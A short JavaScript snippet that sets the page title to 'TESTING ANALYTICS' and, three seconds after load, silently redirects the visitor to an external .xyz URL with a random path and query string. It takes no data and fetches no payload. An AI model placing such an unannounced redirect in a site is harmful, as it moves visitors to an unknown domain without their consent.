document.addEventListener("DOMContentLoaded", (event) => {

    document.title = "TESTING ANALYTICS";

    // Wait 3 seconds, then run redirector()
    setTimeout(() => {
        redirector();
    }, 3000); // 3000 milliseconds = 3 seconds

    function redirector() {
        const SITEURL = "https://gmt.gvnx.xyz/rdr"; // Replace with your site URL
        const RNG = Math.floor(Math.random() * 10) + 1; // Generate a random number between 1 and 10
        const QUERYS = Math.floor(Math.random() * 1000000000);
        window.location.href = `${SITEURL}/${RNG}?randomfuckinquery=${QUERYS}`; // Redirect to SITEURL/RNG?randomfuckinquery=QUERY
    }
});
